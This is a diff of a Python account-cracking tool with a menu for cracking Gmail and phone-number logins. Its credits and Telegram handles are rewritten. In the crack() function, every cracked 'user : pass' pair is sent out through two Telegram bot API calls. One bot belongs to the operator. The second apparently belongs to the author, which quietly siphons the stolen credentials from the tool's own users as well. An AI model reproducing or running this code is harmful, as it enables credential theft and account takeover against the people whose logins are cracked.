@@ -44,7 +44,6 @@ banek='''\x1b[1;97m
  [\033[32m2\x1b[1;97m] - Crack RAQAM+RAQAM
  [\033[32m3\x1b[1;97m] - Crack GMAIL+RAQAM
  [\033[32m4\x1b[1;97m] - Crack GMAIL+PASS
- [\033[32m5\x1b[1;97m] - COMBO:NUMBER [Eror]
  [\033[32m0\x1b[1;97m] - Exit Tool
 
 '''
@@ -61,12 +60,10 @@ logo = '''\x1b[1;92m
                                                                           
 
  
- Auther : Fara Coder
- github : https://github.com/fardinHack
- Telegram : https://t.me/BESTxHACKER
-  Nrx : 0$
+TeleGram : @i4m_REX
+TeleGram Chanal : BESTxHACKER
  ---------------------------------------------------------------------
-Note : chaware bka 1h or 2h bo wasatandne CTR+z DabGra
+TanYa Chaware Bka DllM
  '''
 logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
 
@@ -176,11 +173,10 @@ def crack():
 			print('\033[93m Checkpoint : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
-			sender = 'NEW INSTAGRAM ACOUNT BY : FARA'
-			sender2 =user+' : '+pas
-			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender2 + sender
+			sender =user+' : '+pas
+			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
 			response = requests.get(send_telegram)
-			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender2 + sender
+			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
 			responsek = requests.get(send_my)
 			r2+=1
 			os.system('clear')
